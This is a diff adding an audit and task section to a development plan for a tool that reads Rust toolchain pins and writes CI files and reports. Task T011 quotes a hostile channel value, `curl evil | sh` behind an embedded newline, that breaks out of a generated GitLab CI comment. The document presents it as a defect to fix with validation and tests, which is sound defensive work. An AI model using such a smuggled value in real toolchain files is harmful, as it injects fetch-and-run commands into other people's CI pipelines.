@@ -297,3 +297,139 @@ not read, a `path` toolchain is never recorded, and a Rust version has no suppor
 product, so the Platform record is unchanged — D21). `delivery/survey/pinned.md` gains no row: the Cargo row was written
 under the method and the TG8 tests characterise code this slice does not change. `make -f delivery/Makefile smoke` still
 says none is recorded until a person regenerates the targets (D6). No task here fixes them.
+
+## Phase 4: Converge pass 1 — what the slice still owes
+
+Appended by converge pass 1 (2026-10-01, at 4158414). Each task closes a class, not the one tree that showed it. The
+rustup observations below were made by the converge pass with rustup 1.29.0, `RUSTUP_AUTO_INSTALL=0`, `rustup show
+active-toolchain`, in probe trees under `$HOME/.cache/slippy-toolchain-pin-tmp/converge/`, with a root
+`rust-toolchain` holding `1.98.1` above the probed directory where a walk was in question.
+
+- [ ] T011 [US2] **HIGH — the recorded Rust version is a toolchain name or nothing: a channel holding a newline, a
+  space, a quote or a replacement character is not recorded** (D21's reason: "the recorded value is what rustup and the
+  setup action will consume"; TG5; TG9). Depends on a decision the delegating session records (proposed D23 below).
+  Files: `src/slipwai/ecosystems/cargo.py`, `tests/test_survey_cargo_toolchain.py`, `changelog.d/rust-cargo-adopt.md`.
+  - **What is wrong.** `pinned_channel` (`cargo.py:59-68`) returns any TOML string and `legacy_channel` (`cargo.py:71-79`)
+    any one stripped line; before this slice the Cargo version was always `""`, so nothing read from the tree reached a
+    generated file through it. Observed: a crate whose `rust-toolchain.toml` says
+    `channel = "1.85\n  script: [\"curl evil | sh\"]"`, adopted with a GitLab `origin`, gets a
+    `delivery/ci/verify-delivery.gitlab-ci.yml` whose comment line (`project/adopted_ci.py:161-162`) is broken out of —
+    line 10 reads `  script: ["curl evil | sh"], or install them in before_script` and the file no longer parses as
+    YAML — and the same break in `delivery/survey/survey.md:8-9` (`adopt_report.py:52`), `delivery/docs/adoption.md:12-13`
+    (`project/adopted.py:112`) and `delivery/commands/ground.md:171-172` (`project/ground_command.py:118-121`). A
+    `rust-toolchain` of one line holding invalid UTF-8 records `1.85�` (the bounded `read` decodes with
+    `replace`). A quote in a channel will break the `toolchain: '<version>'` input `ci-toolchain` writes from it (D19).
+    rustup itself refuses each of these names (`error: custom toolchain '1.98.1\nfoo' … is not installed`; the same for
+    `1.98.1 x` and `1.98.1'`), so recording nothing loses nothing rustup could build with.
+  - **Proposed D23 (handed back, not decided here):** the version is recorded only where the channel matches a rustup
+    toolchain name a runner can install — `^[A-Za-z0-9][A-Za-z0-9._-]*$` — and is empty otherwise; every TG4 shape
+    (`1.85`, `1.85.0`, `stable`, `nightly`, `nightly-2025-01-01`, `1.85-beta`, and `Stable`, `v1.85`) still passes as
+    written. Spec TG5 gains the clause.
+  - **The sweep.** Both producers (`pinned_channel`, the one-line branch of `legacy_channel`) pass through the one check,
+    applied once in `rust_toolchain` so no later reader can bypass it. RED at the survey's boundary: one subtest per
+    shape — newline, space, tab, `'`, `"`, backtick, `�` from invalid UTF-8, a control character — each in
+    `rust-toolchain.toml` and in a one-line `rust-toolchain`, each recording `{"kind": "rust", "version": ""}`. And one
+    test through `slipwai adopt --yes` of a crate with the newline channel and a GitLab `origin`: every line of
+    `delivery/ci/verify-delivery.gitlab-ci.yml`, `delivery/survey/survey.md` and `delivery/docs/adoption.md` that names
+    the toolchain is one line, and no line outside a comment in the GitLab job comes from the pin. Observe each fail
+    first on today's row.
+  - Fragment: say in the Cargo paragraph that a channel that is not a toolchain name is not recorded.
+  - Handed back, not this slice's: the same class exists for every ecosystem whose pin reaches `setup_steps`
+    (`project/adopted_ci.py:63`, `'{version}'` single-quoted) — a `.nvmrc` holding a quote — in code that was here
+    before the method. The delegating session decides whether that is a slice of its own.
+
+- [ ] T012 [US2] **MEDIUM — where rustup cannot read a toolchain file it skips it and keeps looking; the survey decides
+  there with an empty pin, and reads a byte-order-marked `.toml` as no pin where rustup reads its channel** (D21's
+  reason; D22's precedent; TG1, TG5). Depends on a decision the delegating session records (proposed D24 below).
+  Files: `src/slipwai/ecosystems/cargo.py`, `tests/test_survey_cargo_toolchain.py`,
+  `specs/001-rust-cargo-adopt/slices/toolchain-pin/research.md`, `changelog.d/rust-cargo-adopt.md`.
+  - **Observed** (rustup vs the survey at 4158414):
+    - R15 — a dangling `rust-toolchain` symlink in `sub`: rustup `1.98.1 (overridden by …/rust-toolchain)`, the root's;
+      the survey `""` (enshrined by `test_a_dangling_link_in_the_candidates_directory_decides_as_an_empty_pin`, test
+      file line 129).
+    - R16 — a directory named `rust-toolchain.toml` in `sub`: rustup the root's `1.98.1`; the survey `""` where a pin
+      sits above.
+    - R17 — a directory named `rust-toolchain` beside a `rust-toolchain.toml` holding `stable`: rustup `stable`, from the
+      `.toml`; the survey `""`.
+    - R18 — a `rust-toolchain` mode `000`, and one holding invalid UTF-8 (`1.85\xff`): rustup skips each and uses the
+      root's `1.98.1`; the survey records `""` and `1.85�` respectively.
+    - R19 — a `rust-toolchain.toml` starting with U+FEFF: rustup `1.98.1`, its channel; the survey `""` (enshrined by
+      the `"a byte order mark"` subtest, test file line 61). `cargo.py`'s own `WORKSPACE` comment already treats a BOM as
+      something Cargo reads.
+  - **Proposed D24 (handed back, not decided here):** follow rustup, as D22 did — a toolchain file that cannot be read
+    as UTF-8 text (missing, dangling, a directory, unreadable, invalid UTF-8) is passed over, within the directory to the
+    other name and then upward; a FIFO is never opened and is passed over the same way; a leading U+FEFF is removed
+    before TOML is parsed; an oversize file stays no pin and decides. TG1 and TG5's wording ("non-regular file … records
+    empty") are refined accordingly. If the owner keeps TG5 as worded, this task is closed with the decision and the two
+    tests stay.
+  - **The sweep.** Every case where a name exists in the directory but the bounded `read` returns `""` (the
+    `os.path.lexists` test at `cargo.py:88` and `bounded_read.read`'s non-regular, unreadable and undecodable
+    branches), and every byte-level prefix `tomllib` rejects that rustup's TOML reader accepts (the BOM). RED at the
+    survey's boundary over R15–R19's trees, each with a root pin above; flip the two enshrining tests. Add R15–R19 to
+    `research.md` as observed rows. The fragment's "the nearest directory holding either deciding" names the exception.
+
+- [ ] T013 [US2] **MEDIUM — TG9's hand-over and the pin's other readers are claimed, not proved** (TG9; plan *Not working
+  yet*). Depends on T011. Files: `tests/test_survey_cargo_toolchain.py`.
+  - TG9 says the adopted CI writes no Rust setup step in this slice; no test adopts a pinned crate and reads the gate's
+    CI. Since this slice the pin also reaches the GitLab job's comment (`adopted_ci.py:161`, now `rust 1.85` where it
+    said `rust`), `delivery/docs/adoption.md` (`project/adopted.py:112`) and `/ground`'s Platform line
+    (`ground_command.py:118-121`, now "runs on rust 1.85 (detected)" where it said "no runtime version is pinned
+    anywhere in the tree") — none asserted.
+  - **The sweep:** one test through `slipwai adopt --yes` of the pinned crate per reader of `toolchain.version`
+    (`grep -rn "\"version\"\]\|get(\"version\")" src/slipwai` lists them): with a GitHub `origin`, the workflow names no
+    Rust setup action and no `1.85`; with a GitLab `origin`, the job's comment names `rust 1.85`; `adoption.md` and
+    `ground.md` carry `rust 1.85`. Each observed to bite by recording `""` in the row and restoring with
+    `git checkout -- src/slipwai/ecosystems/cargo.py`.
+
+- [ ] T014 [US2] **LOW — the `docs/adopting.md` clause is one unwrapped line** (`docs/adopting.md:28`, 242
+  characters where the page wraps at 120). Files: `docs/adopting.md`. Rewrap the sentence; change no word.
+
+## Convergence
+
+**Verdict (pass 1 of 2): not converged.** One HIGH (T011) re-opens the loop; T012 and T013 are MEDIUM, T014 LOW. T011 and
+T012 each need a decision the delegating session records first (proposed D23, D24); converge did not choose them.
+
+Each level, what the diff proves and what it does not:
+
+- **Domain — the pin reading** (`src/slipwai/ecosystems/cargo.py:55-94`). Proves TG1-TG6 as worded for regular UTF-8
+  files: the walk to the root and never above (test file lines 115, 122, 135), the legacy file first (109, 112), one line
+  versus TOML (89-106, D22), every TG4 shape verbatim (38), the unusable pins (52), `rust-version` ignored (75). Does not
+  prove that the recorded value is one rustup could install (T011), nor rustup's reading where a file cannot be read or
+  carries a BOM (T012).
+- **Use case — survey / adopt / adopt --refresh.** Proves the survey answer (every test enters at `survey`), the adopted
+  record (156), TG8's refresh of a detected empty version (187), the disagreement for confirmed and overridden (196) and
+  the second refresh's no-op (207); `scripts/test-adoption.py:98,133` holds the fixture end to end (T010's run). Does
+  not prove the hostile-channel path (T011).
+- **Delivery adapter — CLI output, survey page, project.json.** Proves the survey page's `rust 1.85` and its absence
+  (156, 162) and the record `{"kind", "version", "ecosystem"}` (160). `adopt`'s stdout does not name the version, and
+  TG7 does not ask it to. Does not prove the other pages the pin now reaches, nor that a channel cannot break them
+  (T011, T013).
+- **Screen — none.** The slice is a CLI's survey.
+- **Published contract.** `project.json`'s toolchain shape is unchanged (test lines 38-45 assert exactly `kind` and
+  `version`; 160 with `ecosystem`). The fragment amends the pin out of *What stays out* and names TG8 in its Catch-up
+  (`changelog.d/rust-cargo-adopt.md:24-31, 58-60`). `docs/adopting.md:28` names where the pin is read (T014 is its
+  wrapping). The hand-over to `ci-toolchain` per TG9 is the version string only, as designed, but its "no Rust step"
+  half is unproved (T013), and the string it hands over is not yet safe to put in a workflow (T011).
+
+Constitution principles the diff touches:
+
+- **I — what a project was given keeps meaning what it meant.** Satisfied: the Cargo row was never released (it is in
+  `changelog.d/`, not `CHANGELOG.md`); the fragment stays `MINOR` (`changelog.d/rust-cargo-adopt.md:1`) and says
+  experimental (`:22`); `VERSION` stays `1.4.0.dev0`; the Catch-up note is written (`:58-60`); other ecosystems keep
+  their answers — the walk is called by the Cargo row alone (`cargo.py:112`; test line 140).
+- **II — re-running is safe.** Satisfied: `adopt --refresh` over an unchanged pinned tree changes nothing
+  (`tests/test_survey_cargo_toolchain.py:207-215`; `scripts/test-adoption.py`'s re-survey no-op in T010's run); the walk
+  stops at the root, so nothing outside the checkout can change the answer (test line 135).
+- **III — simplicity.** Satisfied: three functions beside the row that calls them (`cargo.py:55-94`), no new field, no
+  new module; the `reader` seam on `rust_toolchain` is unused by its caller (`cargo.py:82,112`), left as the sibling
+  functions have it.
+- **V (as it holds today) — tests at the boundary, fakes in the test tree, no mocking framework.** Satisfied: every new
+  test enters at `survey` or `slipwai adopt` over a tree on disk (`tests/test_survey_cargo_toolchain.py:24-30, 149-154`);
+  no mock imported. The principle's in-force text is a target, not yet in force.
+- **VIII — what a repository records is a contract.** Satisfied: no key added to `project.json`; `toolchain.version` is
+  a string it already carried (test lines 38-45, 160).
+- **VII, IX — touched and not breached by a MUST, but T011's class is where they would be:** no refusal is added (an
+  unusable pin is empty, never an error, per D21) and no credential is involved; the generated CI file the pin can break
+  is T011.
+- IV, VI, X, XI — not touched (no port, no third-party adapter, no branch policy, no pipeline route; X and XI are
+  targets not yet in force).
